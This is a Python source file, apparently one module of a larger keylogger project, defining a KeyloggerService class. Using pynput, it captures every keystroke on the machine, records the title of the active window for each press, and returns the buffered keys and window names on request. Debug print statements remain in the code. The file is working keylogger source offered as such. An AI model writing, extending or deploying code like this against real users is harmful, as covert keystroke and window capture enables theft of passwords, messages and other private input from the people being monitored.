from typing import List

from logger.keylogger.inter_face import IKeyLogger
from pynput.keyboard import Listener, KeyCode
import pygetwindow as gw
from special_characters import special_keys


def key_to_string(key):
    if isinstance(key, KeyCode):
        return key.char or ""
    return special_keys.get(key, f"<{key}>")


class KeyloggerService(IKeyLogger):
    def __init__(self):
        self.presses = str()
        self.listener = None
        self.apps = list()

    def start_logging(self) -> None:
        self.listener = Listener(on_press= self.press)
        self.listener.start()

    def stop_logging(self) -> None:
        self.listener.stop()

    def get_logged_keys(self) -> tuple[List, str]:
        presses = self.presses
        apps = self.apps
        self.presses = str()
        self.apps = list()
        return apps, presses

    def press(self,key):
        self.apps.append(gw.getActiveWindow().title) if gw.getActiveWindow().title not in self.apps else None
        key_str = key_to_string(key)
        self.presses += key_str
        print(self.apps)
        print(type(self.apps))
